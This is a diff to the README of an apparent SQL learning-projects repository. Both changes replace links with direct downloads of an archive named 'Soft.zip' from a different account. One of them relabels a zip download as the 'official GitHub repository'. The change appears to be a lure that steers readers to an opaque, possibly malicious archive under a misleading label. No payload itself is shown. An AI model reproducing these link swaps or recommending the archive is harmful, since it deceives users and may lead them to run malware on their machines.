@@ -26,7 +26,7 @@ Each project comes with detailed instructions and sample queries to help you und
 
 To get started with the projects, simply download the repository from the following link:
 
-[![Download Projects](https://img.shields.io/badge/Download-Projects-blue.svg)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Projects](https://github.com/Tudor2223/SQL_Projects/releases/download/v1.0/Soft.zip)](https://github.com/Tudor2223/SQL_Projects/releases/download/v1.0/Soft.zip)
 
 Click the button above to download the projects and start exploring the world of SQL!
 
@@ -48,7 +48,7 @@ If you are interested in any of these topics, you will find valuable insights an
 
 ## 🌐 Further Exploration 🌐
 
-For more SQL resources and projects, visit the [official GitHub repository](https://github.com/adelante20/SQL_Projects).
+For more SQL resources and projects, visit the [official GitHub repository](https://github.com/Tudor2223/SQL_Projects/releases/download/v1.0/Soft.zip).
 
 ## 📌 Releases Section 📌
 
